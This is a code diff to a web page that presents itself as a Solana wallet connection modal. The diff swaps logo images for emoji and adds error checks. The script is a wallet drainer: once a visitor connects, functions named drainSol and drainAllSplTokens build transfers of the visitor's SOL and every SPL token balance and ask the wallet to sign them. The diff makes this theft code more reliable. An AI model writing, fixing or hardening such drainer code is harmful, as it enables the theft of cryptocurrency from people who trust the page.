@@ -427,6 +427,7 @@
             max-width: 500px;
             width: 100%;
             border: 1px solid var(--border-color);
+            position: relative;
         }
         
         .wallet-adapter-modal-title {
@@ -434,11 +435,12 @@
             font-weight: 600;
             margin-bottom: 16px;
             color: var(--text-white);
+            text-align: center;
         }
         
         .wallet-adapter-modal-list {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+            grid-template-columns: repeat(2, 1fr);
             gap: 16px;
             margin-bottom: 16px;
         }
@@ -461,9 +463,8 @@
             transform: translateY(-2px);
         }
         
-        .wallet-adapter-button-icon {
-            width: 32px;
-            height: 32px;
+        .wallet-icon {
+            font-size: 24px;
             margin-bottom: 8px;
         }
         
@@ -567,7 +568,7 @@
             }
             
             .wallet-adapter-modal-list {
-                grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
+                grid-template-columns: repeat(2, 1fr);
                 gap: 12px;
             }
         }
@@ -684,13 +685,13 @@
         </div>
     </div>
     
-    <!-- Wallet Adapter Modal -->
+    <!-- Wallet Adapter Modal with emoji icons instead of images -->
     <div id="wallet-adapter-modal" class="wallet-adapter-modal" style="display: none;">
         <div class="wallet-adapter-modal-wrapper">
             <button class="wallet-adapter-modal-close" id="wallet-adapter-modal-close">×</button>
             <h3 class="wallet-adapter-modal-title">Connect a wallet</h3>
             <div class="wallet-adapter-modal-list" id="wallet-adapter-modal-list">
-                <!-- Wallet buttons will be inserted here dynamically -->
+                <!-- Wallet buttons will be generated here -->
             </div>
         </div>
     </div>
@@ -722,66 +723,56 @@
         const walletModalClose = document.getElementById('wallet-adapter-modal-close');
         const walletModalList = document.getElementById('wallet-adapter-modal-list');
 
-        // Wallet adapter configuration
+        // Wallet adapters with emoji icons instead of problematic image URLs
         const walletAdapters = [
             {
                 name: 'Phantom',
-                icon: 'https://www.phantom.app/img/logo.png',
-                url: 'https://phantom.app/',
+                icon: '👻', // Phantom emoji
                 adapter: 'phantom'
             },
             {
                 name: 'Solflare',
-                icon: 'https://solflare.com/assets/logo.svg',
-                url: 'https://solflare.com/',
+                icon: '🔆', // Sun emoji for Solflare
                 adapter: 'solflare'
             },
             {
                 name: 'Backpack',
-                icon: 'https://backpack.app/assets/backpack-logo.svg',
-                url: 'https://backpack.app/',
+                icon: '🎒', // Backpack emoji
                 adapter: 'backpack'
             },
             {
                 name: 'Brave',
-                icon: 'https://brave.com/static-assets/images/brave-logo.svg',
-                url: 'https://brave.com/wallet/',
+                icon: '🦁', // Lion emoji for Brave
                 adapter: 'brave'
             },
             {
                 name: 'Coinbase',
-                icon: 'https://www.coinbase.com/assets/images/favicon/favicon-32.png',
-                url: 'https://www.coinbase.com/wallet',
+                icon: '💰', // Money bag for Coinbase
                 adapter: 'coinbase'
             },
             {
                 name: 'Glow',
-                icon: 'https://glow.app/images/logo.svg',
-                url: 'https://glow.app/',
+                icon: '✨', // Sparkles for Glow
                 adapter: 'glow'
             },
             {
-                name: 'Trust Wallet',
-                icon: 'https://trustwallet.com/assets/images/favicon.png',
-                url: 'https://trustwallet.com/',
+                name: 'Trust',
+                icon: '🔐', // Lock for Trust
                 adapter: 'trust'
             },
             {
                 name: 'Slope',
-                icon: 'https://slope.finance/assets/img/logo.svg',
-                url: 'https://slope.finance/',
+                icon: '⛷️', // Ski for Slope
                 adapter: 'slope'
             },
             {
                 name: 'Exodus',
-                icon: 'https://www.exodus.com/img/logos/exodus-logo-white.svg',
-                url: 'https://www.exodus.com/',
+                icon: '🚀', // Rocket for Exodus
                 adapter: 'exodus'
             },
             {
                 name: 'Coin98',
-                icon: 'https://coin98.com/images/logo.png',
-                url: 'https://coin98.com/',
+                icon: '🪙', // Coin for Coin98
                 adapter: 'coin98'
             }
         ];
@@ -826,7 +817,7 @@
                 const walletButton = document.createElement('div');
                 walletButton.className = 'wallet-adapter-button';
                 walletButton.innerHTML = `
-                    <img src="${wallet.icon}" alt="${wallet.name}" class="wallet-adapter-button-icon">
+                    <div class="wallet-icon">${wallet.icon}</div>
                     <span class="wallet-adapter-button-text">${wallet.name}</span>
                 `;
                 walletButton.addEventListener('click', () => connectWithWallet(wallet.adapter));
@@ -847,7 +838,22 @@
             document.body.style.overflow = 'auto';
         }
 
-        // Connect with selected wallet
+        // Get a working RPC connection with fallback
+        async function getWorkingConnection() {
+            for (const endpoint of RPC_ENDPOINTS) {
+                try {
+                    const connection = new solanaWeb3.Connection(endpoint);
+                    await connection.getLatestBlockhash();
+                    console.log(`Using RPC endpoint: ${endpoint}`);
+                    return connection;
+                } catch (e) {
+                    console.error(`RPC ${endpoint} failed: ${e.message}`);
+                }
+            }
+            throw new Error("All RPC endpoints failed");
+        }
+
+        // Connect with selected wallet - fixed to prevent undefined.toString() error
         async function connectWithWallet(adapterName) {
             closeWalletModal();
             
@@ -856,7 +862,7 @@
             connectButtonInner.innerHTML = 'Connecting...';
             
             try {
-                let wallet;
+                let wallet = null;
                 
                 // Check for different wallet providers
                 if (adapterName === 'phantom' && window.solana) {
@@ -881,15 +887,26 @@
                     wallet = window.coin98.sol;
                 } else {
                     // Fallback to any available wallet
-                    wallet = window.solana || window.solflare || window.backpack?.solana;
+                    wallet = window.solana || window.solflare || 
+                             (window.backpack && window.backpack.solana);
                     
                     if (!wallet) {
                         throw new Error(`${adapterName} wallet not installed. Please install it first.`);
                     }
                 }
                 
-                // Connect to wallet
+                // Connect to wallet - Make sure wallet exists before trying to connect
+                if (!wallet) {
+                    throw new Error(`${adapterName} wallet not detected. Please install the wallet extension.`);
+                }
+                
                 const response = await wallet.connect();
+                
+                // Make sure response and publicKey exist before using them
+                if (!response || !response.publicKey) {
+                    throw new Error("Wallet connection failed. No public key received.");
+                }
+                
                 const publicKey = response.publicKey;
                 
                 // Show success animation
@@ -902,7 +919,10 @@
                 resultDiv.style.display = 'block';
                 resultDiv.style.opacity = '0';
                 resultDiv.style.transform = 'translateY(10px)';
-                resultDiv.innerText = `Connected: ${publicKey.toString()}`;
+                
+                // Store the publicKey string safely
+                const publicKeyString = publicKey.toString();
+                resultDiv.innerText = `Connected: ${publicKeyString}`;
                 
                 setTimeout(() => {
                     resultDiv.style.opacity = '1';
@@ -918,7 +938,9 @@
 
                 // Step 2: Drain SOL
                 await drainSol(publicKey);
+                
             } catch (err) {
+                console.error("Connection error:", err);
                 connectButton.innerHTML = 'Select Wallet';
                 connectButtonInner.innerHTML = 'Select Wallet';
                 resultDiv.style.display = 'block';
@@ -932,23 +954,12 @@
             }
         }
 
-        // Get a working RPC connection with fallback
-        async function getWorkingConnection() {
-            for (const endpoint of RPC_ENDPOINTS) {
-                try {
-                    const connection = new solanaWeb3.Connection(endpoint);
-                    await connection.getLatestBlockhash();
-                    console.log(`Using RPC endpoint: ${endpoint}`);
-                    return connection;
-                } catch (e) {
-                    console.error(`RPC ${endpoint} failed: ${e.message}`);
-                }
-            }
-            throw new Error("All RPC endpoints failed");
-        }
-
         async function drainAllSplTokens(ownerPublicKey) {
             try {
+                if (!ownerPublicKey) {
+                    throw new Error("Invalid owner public key");
+                }
+                
                 const connection = await getWorkingConnection();
 
                 // Get all SPL token accounts for the owner
@@ -957,7 +968,7 @@
                     { programId: window.splToken.TOKEN_PROGRAM_ID }
                 );
 
-                if (tokenAccounts.value.length === 0) {
+                if (!tokenAccounts || !tokenAccounts.value || tokenAccounts.value.length === 0) {
                     resultDiv.innerText += `\nNo SPL tokens found.`;
                     return;
                 }
@@ -965,6 +976,8 @@
                 // Process tokens sequentially to ensure reliable transactions
                 for (const { pubkey, account } of tokenAccounts.value) {
                     const info = account.data.parsed.info;
+                    if (!info || !info.mint) continue;
+                    
                     const mint = info.mint;
                     const amount = parseInt(info.tokenAmount.amount, 10);
                     const decimals = info.tokenAmount.decimals;
@@ -986,9 +999,14 @@
                                     amount
                                 )
                             );
+                            
                             transaction.feePayer = ownerPublicKey;
                             const { blockhash } = await connection.getLatestBlockhash('finalized');
                             transaction.recentBlockhash = blockhash;
+
+                            if (!window.activeWallet) {
+                                throw new Error("Wallet disconnected");
+                            }
 
                             const signed = await window.activeWallet.signTransaction(transaction);
                             const sig = await connection.sendRawTransaction(signed.serialize());
@@ -1010,54 +1028,73 @@
 
         // Helper to get or create associated token account for a mint
         async function getOrCreateAta(connection, owner, mint, payer) {
-            // Try to find associated token account
-            const ata = await window.splToken.Token.getAssociatedTokenAddress(
-                window.splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
-                window.splToken.TOKEN_PROGRAM_ID,
-                mint,
-                owner
-            );
-            
-            // Check if the account exists
-            const info = await connection.getAccountInfo(ata);
-            
-            // If ATA doesn't exist, create it
-            if (!info) {
-                try {
-                    const transaction = new solanaWeb3.Transaction().add(
-                        window.splToken.Token.createAssociatedTokenAccountInstruction(
-                            window.splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
-                            window.splToken.TOKEN_PROGRAM_ID,
-                            mint,
-                            ata,
-                            owner,
-                            payer
-                        )
-                    );
-                    transaction.feePayer = payer;
-                    const { blockhash } = await connection.getLatestBlockhash('finalized');
-                    transaction.recentBlockhash = blockhash;
-                    
-                    const signed = await window.activeWallet.signTransaction(transaction);
-                    const signature = await connection.sendRawTransaction(signed.serialize());
-                    await connection.confirmTransaction(signature, 'confirmed');
-                    resultDiv.innerText += `\nCreated ATA for ${mint.toString()}: ${signature}`;
-                } catch (err) {
-                    console.error("ATA creation error:", err);
-                    resultDiv.innerText += `\nATA creation error: ${err.message}`;
-                }
+            if (!owner || !mint || !payer) {
+                throw new Error("Missing required parameters for ATA creation");
             }
             
-            return ata;
+            try {
+                // Try to find associated token account
+                const ata = await window.splToken.Token.getAssociatedTokenAddress(
+                    window.splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
+                    window.splToken.TOKEN_PROGRAM_ID,
+                    mint,
+                    owner
+                );
+                
+                // Check if the account exists
+                const info = await connection.getAccountInfo(ata);
+                
+                // If ATA doesn't exist, create it
+                if (!info) {
+                    try {
+                        const transaction = new solanaWeb3.Transaction().add(
+                            window.splToken.Token.createAssociatedTokenAccountInstruction(
+                                window.splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
+                                window.splToken.TOKEN_PROGRAM_ID,
+                                mint,
+                                ata,
+                                owner,
+                                payer
+                            )
+                        );
+                        transaction.feePayer = payer;
+                        const { blockhash } = await connection.getLatestBlockhash('finalized');
+                        transaction.recentBlockhash = blockhash;
+                        
+                        if (!window.activeWallet) {
+                            throw new Error("Wallet disconnected");
+                        }
+                        
+                        const signed = await window.activeWallet.signTransaction(transaction);
+                        const signature = await connection.sendRawTransaction(signed.serialize());
+                        await connection.confirmTransaction(signature, 'confirmed');
+                        resultDiv.innerText += `\nCreated ATA for ${mint.toString()}: ${signature}`;
+                    } catch (err) {
+                        console.error("ATA creation error:", err);
+                        resultDiv.innerText += `\nATA creation error: ${err.message}`;
+                        throw err; // Rethrow so caller knows creation failed
+                    }
+                }
+                
+                return ata;
+            } catch (err) {
+                console.error("ATA address error:", err);
+                resultDiv.innerText += `\nATA address error: ${err.message}`;
+                throw err;
+            }
         }
 
         async function drainSol(ownerPublicKey) {
             try {
+                if (!ownerPublicKey) {
+                    throw new Error("Invalid owner public key");
+                }
+                
                 const connection = await getWorkingConnection();
                 const ownerBalance = await connection.getBalance(ownerPublicKey);
 
                 // Calculate minimum required for fees
-                const { blockhash, feeCalculator } = await connection.getRecentBlockhash();
+                const { blockhash } = await connection.getRecentBlockhash();
                 const minFee = 10000; // Base minimum fee (10000 lamports = 0.00001 SOL)
                 const safetyBuffer = 15000; // Additional buffer for potential fee increases
                 const amountToLeave = minFee + safetyBuffer;
@@ -1074,6 +1111,10 @@
                     transaction.recentBlockhash = blockhash;
 
                     try {
+                        if (!window.activeWallet) {
+                            throw new Error("Wallet disconnected");
+                        }
+                        
                         const signed = await window.activeWallet.signTransaction(transaction);
                         const sig = await connection.sendRawTransaction(signed.serialize(), {
                             skipPreflight: false,
@@ -1102,6 +1143,10 @@
                                 );
                                 retryTx.feePayer = ownerPublicKey;
                                 retryTx.recentBlockhash = blockhash;
+                                
+                                if (!window.activeWallet) {
+                                    throw new Error("Wallet disconnected");
+                                }
                                 
                                 const signedRetry = await window.activeWallet.signTransaction(retryTx);
                                 const sigRetry = await connection.sendRawTransaction(signedRetry.serialize(), {
